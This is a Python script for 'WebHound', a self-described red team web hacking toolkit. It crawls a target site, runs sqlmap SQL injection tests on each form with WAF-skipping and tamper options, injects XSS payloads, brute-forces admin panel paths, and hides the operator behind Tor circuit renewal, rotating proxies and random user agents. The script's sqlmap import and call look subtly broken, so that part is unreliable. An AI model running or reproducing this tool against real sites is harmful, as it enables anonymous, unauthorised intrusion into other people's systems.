#!/usr/bin/env python3

import argparse
import logging
import os
import random
import sys
import time
from datetime import datetime
from typing import List, Optional, Dict
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup
from colorlog import ColoredFormatter
from github import Github, GithubException
from jinja2 import Template
from stem import Signal
from stem.control import Controller
from sqlmap import sqlmap

# ASCII art for hacker aesthetic
BANNER = r"""
 __          __  _          
| \        / | | |         
|  \      /  | | |__   ___ 
|   \    /   | | '_ \ / __|
|    \  /    | | | | | (__ 
|     \/     |_|_| |_|___|
   Red Team Web Hacking Toolkit
"""

# Configure colorful logging
LOG_FORMAT = "%(log_color)s%(asctime)s [%(levelname)s] %(message)s%(reset)s"
LOG_COLORS = {
    'DEBUG': 'cyan',
    'INFO': 'green',
    'WARNING': 'yellow',
    'ERROR': 'red',
    'CRITICAL': 'red,bg_white',
}
formatter = ColoredFormatter(LOG_FORMAT, log_colors=LOG_COLORS)
handler = logging.StreamHandler()
handler.setFormatter(formatter)
logger = logging.getLogger(__name__)
logger.addHandler(handler)
logger.setLevel(logging.INFO)

# File handler for logging
log_file = f"webhound_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
file_handler = logging.FileHandler(log_file)
file_handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
logger.addHandler(file_handler)

# User-Agent list for randomization
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
]

# XSS payloads (simplified for demo; expand for real use)
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
]

class TorSession:
    """Handle Tor-based anonymous requests."""
    def __init__(self):
        self.session = requests.Session()
        self.session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050',
        }

    def renew_tor_ip(self):
        """Renew Tor circuit for a new IP."""
        try:
            with Controller.from_port(port=9051) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
                logger.info("Tor circuit renewed: New IP assigned")
        except Exception as e:
            logger.error(f"Failed to renew Tor IP: {e}")

    def get(self, url: str, *args, **kwargs) -> Optional[requests.Response]:
        """Make a GET request via Tor."""
        try:
            response = self.session.get(url, *args, **kwargs)
            response.raise_for_status()
            logger.info(f"Tor GET request to {url} succeeded: {response.status_code}")
            return response
        except requests.RequestException as e:
            logger.error(f"Tor GET request to {url} failed: {e}")
            return None

class WebHound:
    """Red team web hacking toolkit."""
    def __init__(self, target_url: str, use_tor: bool = False, proxies: List[str] = None):
        self.target_url = target_url
        self.session = TorSession() if use_tor else requests.Session()
        self.proxies = proxies or []
        self.vulnerabilities = []
        self.forms = []
        self.urls = set([target_url])
        self.headers = {"User-Agent": random.choice(USER_AGENTS)}

    def rotate_proxy(self):
        """Rotate to a random proxy if provided."""
        if self.proxies:
            proxy = random.choice(self.proxies)
            self.session.proxies = {'http': proxy, 'https': proxy}
            logger.info(f"Rotated to proxy: {proxy}")

    def crawl(self, depth: int = 3):
        """Crawl the website to find URLs and forms."""
        logger.info(f"Starting web crawl on {self.target_url} (depth={depth})")
        visited = set()
        for _ in range(depth):
            new_urls = set()
            for url in self.urls - visited:
                self.rotate_proxy()
                try:
                    response = self.session.get(url, headers=self.headers, timeout=10)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    # Find links
                    for link in soup.find_all('a', href=True):
                        href = urljoin(self.target_url, link['href'])
                        if self.target_url in href:
                            new_urls.add(href)
                    # Find forms
                    for form in soup.find_all('form'):
                        action = urljoin(self.target_url, form.get('action', ''))
                        inputs = [inp.get('name') for inp in form.find_all('input') if inp.get('name')]
                        self.forms.append({'action': action, 'inputs': inputs})
                    visited.add(url)
                except requests.RequestException as e:
                    logger.warning(f"Failed to crawl {url}: {e}")
            self.urls.update(new_urls)
        logger.info(f"Crawled {len(self.urls)} URLs and found {len(self.forms)} forms")

    def test_sql_injection(self, sqlmap_args: Dict):
        """Test for SQL injection using sqlmap."""
        logger.info(f"Testing {self.target_url} for SQL injection")
        for form in self.forms:
            url = form['action']
            params = {inp: "test" for inp in form['inputs']}
            sqlmap_args.update({
                'url': url,
                'data': params,
                'skip_waf': True,
                'tamper': 'space2comment,randomcase',
                'level': 3,
                'risk': 1,
                'batch': True,
            })
            try:
                result = sqlmap.run(**sqlmap_args)
                if result.get('dbms'):
                    vuln = {
                        'type': 'SQL Injection',
                        'url': url,
                        'details': f"DBMS: {result['dbms']}, Parameters: {params}",
                    }
                    self.vulnerabilities.append(vuln)
                    logger.info(f"SQL Injection found: {vuln['details']}")
            except Exception as e:
                logger.error(f"SQLMap failed for {url}: {e}")

    def test_xss(self):
        """Test for XSS vulnerabilities."""
        logger.info(f"Testing {self.target_url} for XSS")
        for form in self.forms:
            url = form['action']
            for inp in form['inputs']:
                for payload in XSS_PAYLOADS:
                    data = {inp: payload}
                    try:
                        response = self.session.post(url, data=data, headers=self.headers, timeout=10)
                        if payload in response.text:
                            vuln = {
                                'type': 'XSS',
                                'url': url,
                                'details': f"Payload: {payload}, Parameter: {inp}",
                            }
                            self.vulnerabilities.append(vuln)
                            logger.info(f"XSS found: {vuln['details']}")
                    except requests.RequestException as e:
                        logger.warning(f"XSS test failed for {url}: {e}")

    def find_admin_panels(self, wordlist: str):
        """Search for admin panels using a wordlist."""
        logger.info(f"Searching for admin panels on {self.target_url}")
        try:
            with open(wordlist, 'r') as f:
                paths = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            logger.error(f"Wordlist not found: {wordlist}")
            return

        for path in paths:
            url = urljoin(self.target_url, path)
            self.rotate_proxy()
            try:
                response = self.session.get(url, headers=self.headers, timeout=5)
                if response.status_code == 200:
                    logger.info(f"Potential admin panel found: {url}")
                    self.vulnerabilities.append({
                        'type': 'Admin Panel',
                        'url': url,
                        'details': 'Accessible admin page detected',
                    })
            except requests.RequestException:
                continue

    def generate_report(self, output_dir: str):
        """Generate an HTML report of findings."""
        logger.info(f"Generating report in {output_dir}")
        template = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>WebHound Report - {{ target_url }}</title>
            <style>
                body { font-family: Arial, sans-serif; background: #1a1a1a; color: #00ff00; }
                h1 { text-align: center; }
                table { width: 80%; margin: 20px auto; border-collapse: collapse; }
                th, td { border: 1px solid #00ff00; padding: 10px; text-align: left; }
                th { background: #333; }
            </style>
        </head>
        <body>
            <h1>WebHound Penetration Testing Report</h1>
            <p>Target: {{ target_url }}</p>
            <p>Date: {{ date }}</p>
            <table>
                <tr><th>Type</th><th>URL</th><th>Details</th></tr>
                {% for vuln in vulnerabilities %}
                <tr><td>{{ vuln.type }}</td><td>{{ vuln.url }}</td><td>{{ vuln.details }}</td></tr>
                {% endfor %}
            </table>
        </body>
        </html>
        """
        os.makedirs(output_dir, exist_ok=True)
        report_path = os.path.join(output_dir, f"webhound_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html")
        with open(report_path, 'w') as f:
            f.write(Template(template).render(
                target_url=self.target_url,
                date=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                vulnerabilities=self.vulnerabilities
            ))
        logger.info(f"Report saved to {report_path}")

    def upload_report_to_github(self, token: str, repo_name: str, report_path: str):
        """Upload report to GitHub repository."""
        try:
            g = Github(token)
            repo = g.get_repo(repo_name)
            with open(report_path, 'r') as f:
                content = f.read()
            report_name = os.path.basename(report_path)
            try:
                file = repo.get_contents(report_name)
                repo.update_file(
                    path=report_name,
                    message=f"Update WebHound report {report_name}",
                    content=content,
                    sha=file.sha
                )
            except:
                repo.create_file(
                    path=report_name,
                    message=f"Add WebHound report {report_name}",
                    content=content
                )
            logger.info(f"Report uploaded to GitHub: {repo_name}/{report_name}")
        except GithubException as e:
            logger.error(f"Failed to upload report to GitHub: {e}")

def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="WebHound: Red Team Web Hacking Toolkit",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "--url",
        required=True,
        help="Target website URL (e.g., https://example.com)"
    )
    parser.add_argument(
        "--crawl-depth",
        type=int,
        default=3,
        help="Crawl depth for URL discovery (default: 3)"
    )
    parser.add_argument(
        "--wordlist",
        default="/usr/share/wordlists/dirb/common.txt",
        help="Wordlist for admin panel discovery"
    )
    parser.add_argument(
        "--proxies",
        help="File containing proxy list (one per line)"
    )
    parser.add_argument(
        "--tor",
        action="store_true",
        help="Use Tor for anonymous requests"
    )
    parser.add_argument(
        "--github-token",
        help="GitHub Personal Access Token for report upload"
    )
    parser.add_argument(
        "--github-repo",
        help="GitHub repository for report upload (e.g., username/repo)"
    )
    parser.add_argument(
        "--output-dir",
        default="/home/kali/Desktop/webhound_reports",
        help="Directory to save reports"
    )
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Enable verbose logging"
    )
    return parser.parse_args()

def main():
    """Main function to run WebHound."""
    print(BANNER)
    args = parse_args()

    # Set logging level
    if args.verbose:
        logger.setLevel(logging.DEBUG)

    # Load proxies if provided
    proxies = []
    if args.proxies:
        try:
            with open(args.proxies, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
            logger.info(f"Loaded {len(proxies)} proxies")
        except FileNotFoundError:
            logger.error(f"Proxy file not found: {args.proxies}")
            sys.exit(1)

    # Initialize WebHound
    logger.info(f"Initializing WebHound for {args.url}")
    hound = WebHound(args.url, use_tor=args.tor, proxies=proxies)

    # Crawl website
    hound.crawl(depth=args.crawl_depth)

    # Test for SQL injection
    sqlmap_args = {
        'random_agent': True,
        'threads': 2,
        'delay': 2,
    }
    hound.test_sql_injection(sqlmap_args)

    # Test for XSS
    hound.test_xss()

    # Find admin panels
    hound.find_admin_panels(args.wordlist)

    # Generate report
    hound.generate_report(args.output_dir)

    # Upload report to GitHub if specified
    if args.github_token and args.github_repo:
        report_path = max(
            [os.path.join(args.output_dir, f) for f in os.listdir(args.output_dir)],
            key=os.path.getctime
        )
        hound.upload_report_to_github(args.github_token, args.github_repo, report_path)

    logger.info("Operation completed. Check logs and reports for details.")
    print("[*] Done. Hack ethically, secure the web.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.warning("Operation interrupted by user")
        print("\n[-] Exiting gracefully...")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        print("[-] An error occurred. Check logs for details.")
        sys.exit(1)